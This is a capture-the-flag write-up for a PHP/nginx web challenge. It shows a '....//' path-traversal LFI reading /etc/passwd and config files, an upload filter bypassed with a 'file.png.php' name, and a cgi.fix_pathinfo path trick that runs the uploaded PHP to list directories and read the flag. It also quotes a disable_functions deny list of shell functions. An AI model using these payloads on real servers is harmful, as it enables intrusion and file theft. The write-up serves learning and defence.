# Writeup

### 1. Overview

At first glance at the website, we can expect that the challenge will have something to do with **(mis)configuration**.

There are two buttons: "Prices" and "Contact".

1. "Prices" takes us to `/prices.php`. There is another button redirecting to `get.php?file=php.ini`. The content is indeed some `php.ini` file.

2. On `/contact.php` there is a form expecting an email, a message, and a file (*supposedly* only `.png` and `.jpg` allowed).

### 2. LFI

Trying `get.php?file=....//....//....//....//etc/passwd` returns the passwd file! We can try to read some common files.

Using this technique we can get:
- the source code, specifically `contact.php` could be helpful:
    - `file=....//contact.php`
- the configuration files:
    - `/etc/nginx.conf`
    - `/etc/nginx/conf.d/default.conf`
    - `/etc/php83/php.ini`

These are the three files appearing in the `Dockerfile` attached to the challenge, so we didn't have to guess anything.

Based on the content of that `Dockerfile`, we also know that the flag is in a directory named with a random UUID, so we cannot get it with this LFI.

Note: The above payload works because `str_replace('../', '', $_GET['file'])` is called on the arg, which turns `....//....//....//....//etc/passwd` into `../../../../etc/passwd`.

### 3. Trying out the form

Before looking at the configuration files, let's look at the form on `/contact.php`.

We can take a look at the **source code** which we got from the LFI.

Firsts of all, the `email` and `message` fields just have to exist, but are not used for anything:

```php
# TODO: Send email with message and file url
```

So the only remaining thing is the file upload, and we should focus on that.

```php
# Check file extension
$allowed = array('png', 'jpg');
$filename = $file['name'];
$ext = explode(".", $filename)[1];
if (!in_array($ext, $allowed)) {
    echo 'Invalid file type! Only .png and .jpg files are allowed.';
    return;
}
```

This check **can be bypassed** by naming a file `file.png.php` - that's promising, so let's try uploading!

### 4. File upload

Let's upload a file named `file.png.php` containing some simple PHP, like:

```php
<?php
    echo ("abc");
?>
```

After uploading the file we get a link to `uploads/file.png.php`.

However, upon visiting it, the PHP code is not executed - we see the raw content.

There is a header `Content-Disposition: attachment; filename=file.png.php` present on the response.

### 5. Looking at the configuration

There are some interesting lines in `/etc/nginx/conf.d/default.conf`:

```conf
location ~ \/uploads\/([^/]+)\.php$ {
    add_header Content-Disposition "attachment; filename=$request_basename";
}

# Pass the PHP scripts to PHP-FPM listening on php-fpm.sock
location ~ \.php$ {
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_pass unix:/run/php-fpm.sock;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_index index.php;
    include fastcgi_params;
}
```

If we somehow could make this file matched by the second location, going to the PHP CGI, and not the first - sending it as an attachment...

In the `php.ini` file, there is a line:

```conf
cgi.fix_pathinfo=1
```

This line *could* also be omitted, because this option is set to `true` by default.

It means that given a path like `/uploads/test.png.php/this-does-not-exist.php` the file `test.png.php` will get executed (this path **also** does not match the first location regex)!

### 6. Payload

So, to trigger the PHP code, all we have to do is visit `/uploads/test.png.php/<whatever>.php`.

We can confirm that the previous example with `echo` works. However, `system` fails, due to this line in `php.ini`:

```conf
disable_functions = exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source
```

It seems that RCE is probably off-limits. We can first list `/` using:

```php
<?php print_r (scandir('/')) ?>
```

And then, knowing the random directory, grab the flag:

```php
<?php include('/<random UUID>/flag') ?>
```
